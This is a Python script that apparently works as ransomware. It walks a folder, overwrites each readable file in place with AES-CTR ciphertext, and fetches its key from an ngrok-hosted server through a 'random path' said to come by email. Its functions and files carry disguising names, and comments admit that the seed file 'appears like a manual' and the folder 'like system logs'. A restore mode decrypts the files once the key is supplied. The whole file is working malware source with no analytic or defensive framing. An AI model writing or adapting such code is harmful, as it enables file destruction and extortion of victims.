import os
import time
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import requests
import tkinter as tk
from tkinter import simpledialog, messagebox
import hashlib

def get_key_from_endpoint(random_path):
    # Construct the key retrieval URL
    key_url = f"https://squirrel-pet-bengal.ngrok-free.app/key/{random_path}"
    try:
        # Fetch the key from the server
        response = requests.get(key_url)
        response.raise_for_status()  # Raise an error for HTTP issues
        raw_key = response.text.strip()  # Ensure no extra spaces or newlines
        hashed_key = hashlib.sha256(raw_key.encode()).digest()[:16]  # Derive a 16-byte key
        return hashed_key
    except Exception as e:
        print(f"Failed to retrieve the key: {e}")
        return None

def run_vector(input_data: bytes, config_token: bytes) -> bytes:
    nonce_seed = os.urandom(12)
    counter_seed = b'\x00\x00\x00\x00'
    engine_seed = nonce_seed + counter_seed

    session = Cipher(algorithms.AES(config_token), modes.CTR(engine_seed), backend=default_backend()).encryptor()
    output_blob = session.update(input_data) + session.finalize()
    return nonce_seed + output_blob  # return raw binary blob

def reverse_vector(blob: bytes, config_token: bytes) -> bytes:
    nonce = blob[:12]
    ciphertext = blob[12:]
    counter_seed = b'\x00\x00\x00\x00'
    engine_seed = nonce + counter_seed

    session = Cipher(algorithms.AES(config_token), modes.CTR(engine_seed), backend=default_backend()).decryptor()
    return session.update(ciphertext) + session.finalize()

def scan_and_patch_assets(asset_dir: str, config_token: bytes):
    for dirpath, _, assets in os.walk(asset_dir):
        for asset in assets:
            asset_path = os.path.join(dirpath, asset)

            try:
                with open(asset_path, 'rb') as f:
                    payload = f.read()
            except Exception:
                continue  # unreadable files (permissions, etc.)

            try:
                transformed = run_vector(payload, config_token)
                with open(asset_path, 'wb') as f:  # overwrite with encrypted bytes
                    f.write(transformed)
            except Exception:
                pass  # skip if encryption fails

def restore_assets(asset_dir: str, config_token: bytes):
    for dirpath, _, assets in os.walk(asset_dir):
        for asset in assets:
            asset_path = os.path.join(dirpath, asset)

            try:
                with open(asset_path, 'rb') as f:
                    blob = f.read()

                restored = reverse_vector(blob, config_token)

                with open(asset_path, 'wb') as f:
                    f.write(restored)
            except Exception:
                pass  # skip if decryption fails


# === SYSTEM EXECUTION ===
if __name__ == "__main__":
    import time
    calibration_file = "CV.pdf"  # seed file (appears like a manual)
    resources_folder = "testfolder"       # appears like system logs folder

    root = tk.Tk()
    root.withdraw()  # Hide the main tkinter window

    random_path = simpledialog.askstring("Input Required", "Enter the random path (password) provided in the email:")

    # Retrieve the key using the provided random path
    key = get_key_from_endpoint(random_path)
    print(key)
    if not key:
        messagebox.showerror("Error", "Failed to retrieve the key. Please check your random path.")
        exit(1)
    # Choose mode: 'patch' to encrypt, 'restore' to decrypt
    mode = "restore"  # change to "patch" to encrypt again

    if mode == "patch":
        start = time.time()
        scan_and_patch_assets(resources_folder, key)
        end = time.time()
        print(f" Encryption completed in {end - start:.2f} seconds.")
    elif mode == "restore":
        restore_assets(resources_folder, key)
    else:
        print("Invalid mode. Use 'patch' or 'restore'.")